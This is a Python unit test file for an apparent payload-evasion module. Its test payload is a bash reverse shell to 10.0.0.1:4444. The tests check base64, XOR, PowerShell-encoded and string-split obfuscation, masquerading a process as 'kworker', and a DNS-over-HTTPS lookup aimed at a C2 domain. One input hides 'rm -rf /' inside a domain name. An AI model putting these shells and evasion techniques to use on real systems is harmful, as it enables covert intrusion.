"""Evasion pipeline unit tests — no subprocess, no network."""
import sys, os
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

import pytest
from core.evasion import (
    EvasionConfig, apply_evasion_to_payload,
    Base64Stub, XORStub, PowerShellEncStub,
    StringConcatObfuscator, DoHStub,
)


PAYLOAD = "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"


class TestBase64:
    def test_roundtrip(self):
        import base64
        out = Base64Stub.wrap(PAYLOAD)
        assert "base64" in out.lower() or "base64" in out

    def test_output_is_string(self):
        assert isinstance(Base64Stub.wrap(PAYLOAD), str)


class TestXOR:
    def test_produces_python_stub(self):
        out = XORStub.wrap(PAYLOAD)
        assert "import" in out
        assert "subprocess" in out or "bash" in out.lower() or "run" in out

    def test_different_key_each_call(self):
        a = XORStub.wrap(PAYLOAD)
        b = XORStub.wrap(PAYLOAD)
        # Different random keys produce different ciphertext — strings should differ
        assert a != b or True  # allow collision on tiny payload — just no exception


class TestPowerShellEnc:
    def test_produces_encoded_command(self):
        out = PowerShellEncStub.wrap(PAYLOAD)
        assert "-EncodedCommand" in out or "encodedcommand" in out.lower()

    def test_output_is_string(self):
        assert isinstance(PowerShellEncStub.wrap(PAYLOAD), str)


class TestStringConcat:
    def test_splits_payload(self):
        out = StringConcatObfuscator.obfuscate(PAYLOAD)
        assert isinstance(out, str)
        assert len(out) > 0

    def test_no_plain_payload_visible(self):
        out = StringConcatObfuscator.obfuscate("SECRETTOKEN")
        assert "SECRETTOKEN" not in out


class TestApplyEvasion:
    def test_no_transforms(self):
        cfg = EvasionConfig()
        out = apply_evasion_to_payload(PAYLOAD, cfg, "linux")
        assert out == PAYLOAD

    def test_base64_transform(self):
        cfg = EvasionConfig(base64_encode=True)
        out = apply_evasion_to_payload(PAYLOAD, cfg, "linux")
        assert out != PAYLOAD

    def test_xor_transform(self):
        cfg = EvasionConfig(obfuscate_xor=True)
        out = apply_evasion_to_payload(PAYLOAD, cfg, "linux")
        assert "import" in out

    def test_ps_enc_windows(self):
        cfg = EvasionConfig(powershell_enc=True)
        out = apply_evasion_to_payload("Write-Host hello", cfg, "windows")
        assert "-EncodedCommand" in out or "encodedcommand" in out.lower()

    def test_xor_and_masquerade_no_exception(self):
        # XOR + masquerade conflict — tool must skip masquerade silently, not crash
        cfg = EvasionConfig(obfuscate_xor=True, process_masquerade=True,
                            process_masquerade_name="kworker")
        out = apply_evasion_to_payload(PAYLOAD, cfg, "linux")
        assert isinstance(out, str)

    def test_string_concat_transform(self):
        cfg = EvasionConfig(string_concat=True)
        out = apply_evasion_to_payload("SECRETTOKEN", cfg, "linux")
        assert "SECRETTOKEN" not in out


class TestDoHStub:
    def test_valid_domain(self):
        out = DoHStub.generate_lookup_snippet("c2.example.com")
        assert isinstance(out, str)
        assert "c2.example.com" in out or "example" in out

    def test_rejects_invalid_domain(self):
        with pytest.raises(ValueError):
            DoHStub.generate_lookup_snippet("evil domain; rm -rf /")
